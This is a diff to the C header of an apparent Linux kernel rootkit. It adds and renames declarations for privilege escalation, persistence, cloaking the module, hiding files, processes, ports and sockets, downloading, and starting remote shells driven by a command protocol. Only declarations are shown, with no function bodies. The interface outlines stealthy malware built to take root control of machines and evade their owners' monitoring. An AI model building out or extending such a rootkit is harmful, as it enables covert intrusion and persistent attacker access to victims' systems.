@@ -96,10 +96,14 @@ bool rk_line_matches(struct rk_target_list *list, const char *line, int len);
 /* ---- core/opsec.c ---- */
 
 int  rk_escalate(void);
+int  rk_escalate_pid(pid_t target_pid);
 void rk_cloak(void);
 void rk_uncloak(void);
 int  rk_persist(void);
 int  rk_unpersist(void);
+bool rk_is_persisted(void);
+void rk_auto_hide(struct socket *sock);
+void rk_auto_unhide(void);
 
 /* ---- core/filter.c (kretprobes) ---- */
 
@@ -113,6 +117,7 @@ extern struct kretprobe rk_mkdirat_probe;
 /* ---- network/protocol.c ---- */
 
 struct socket *rk_connect(void);
+struct socket *rk_connect_port(unsigned short port);
 int rk_send_frame(struct socket *sock, const void *buf, size_t len);
 int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
 		  size_t *out_len);
@@ -138,10 +143,9 @@ int cmd_ping(struct rk_session *s, const char *arg);
 int cmd_status(struct rk_session *s, const char *arg);
 int cmd_info(struct rk_session *s, const char *arg);
 int cmd_shell(struct rk_session *s, const char *arg);
-int cmd_exec(struct rk_session *s, const char *arg);
+int cmd_shell_status(struct rk_session *s, const char *arg);
+int cmd_exec_shell(struct rk_session *s, const char *arg);
 int cmd_download(struct rk_session *s, const char *arg);
-int cmd_cloak(struct rk_session *s, const char *arg);
-int cmd_uncloak(struct rk_session *s, const char *arg);
 int cmd_hide_file(struct rk_session *s, const char *arg);
 int cmd_unhide_file(struct rk_session *s, const char *arg);
 int cmd_hide_pid(struct rk_session *s, const char *arg);
@@ -150,16 +154,21 @@ int cmd_hide_content(struct rk_session *s, const char *arg);
 int cmd_unhide_content(struct rk_session *s, const char *arg);
 int cmd_hide_port(struct rk_session *s, const char *arg);
 int cmd_unhide_port(struct rk_session *s, const char *arg);
+int cmd_hide_module(struct rk_session *s, const char *arg);
+int cmd_unhide_module(struct rk_session *s, const char *arg);
+int cmd_unhide_all(struct rk_session *s, const char *arg);
 int cmd_list(struct rk_session *s, const char *arg);
 int cmd_persist(struct rk_session *s, const char *arg);
 int cmd_unpersist(struct rk_session *s, const char *arg);
 int cmd_escalate(struct rk_session *s, const char *arg);
+int cmd_quit(struct rk_session *s, const char *arg);
 
 /* ---- execution/shell.c ---- */
 
 void rk_shells_init(void);
 void rk_shells_cleanup(void);
-int  rk_start_interactive(void);
-int  rk_start_exec(const char *cmd);
+int  rk_start_shell(unsigned short port, u32 request_id, u64 cookie);
+int  rk_start_exec_shell(unsigned short port, u32 request_id, u64 cookie);
+void rk_shell_status(char *buf, size_t len);
 
 #endif /* ROOTKIT_H */
